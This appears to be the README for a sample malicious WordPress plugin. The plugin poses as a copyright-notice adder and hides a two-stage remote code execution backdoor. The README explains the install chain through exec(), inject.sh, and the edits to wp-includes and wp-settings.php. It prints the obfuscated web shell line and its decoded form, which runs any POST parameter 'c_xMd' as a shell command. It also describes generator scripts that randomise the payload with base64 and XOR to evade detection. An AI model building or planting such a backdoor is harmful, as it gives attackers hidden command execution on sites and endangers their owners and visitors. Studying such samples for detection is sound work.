Sample wordpress evil plugin that allows remote code execution. This plugin is not related to any of the files in the main repository.
The 'legit' behaviour of the plugin, appends a copyright notice to all posts and pages at runtime.

It tries to hide it's intention by encoding the suspicious keywords (like exec) with base64 and applying xor to the bytes.
There are two stages:
1. On activation of the plugin, the code executes the code of the inject.sh file using php's exec(). This file inject the second stage in the file wp-includes/plugin-licence.php. It also makes sure that this file is loaded on all wordpress page requests by including wp-includes/plugin-licence.php in wp-settings.php.

2. On every request: if a POST is done with the parameter c_xMd, run an exec with the value of that parameter. It does so by using the line
if(isset(${$p[0]}[$p[1]])){$p[2](${$p[0]}[$p[1]],$o);$p[4]($o);$p[3]();}
When the keywords are decoded, this translates to
if(isset($_POST['c_xMd']])){exec($_POST['c_xMd'],$o);var_dump($o);die();}
execute the command, dump the output, and stop processing any remaining php.

payloadgen.py
Generates the php code for the second stage. This code is generated is to be inserted into inject.sh. A random component is present, so multiple runs of this program yields different outputs.

bootgen.py
Generates the php code of the first stage. This code generated is to be inserted into the plugin php code. The same random component of payloadgen is present.


